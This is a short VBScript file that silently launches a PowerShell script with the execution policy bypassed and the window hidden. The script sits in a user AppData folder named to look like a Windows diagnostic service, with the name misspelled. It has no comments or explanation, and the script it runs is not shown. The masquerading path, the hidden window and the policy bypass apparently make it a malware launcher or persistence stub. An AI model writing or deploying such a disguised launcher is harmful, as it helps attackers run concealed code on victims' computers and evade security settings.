Set objShell = CreateObject("WScript.Shell")
strPath = "powershell.exe -ExecutionPolicy Bypass -File """ & objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\WinSystemDiagnostic\WindowsDiagnosticeService.ps1"""
objShell.Run strPath, 0, False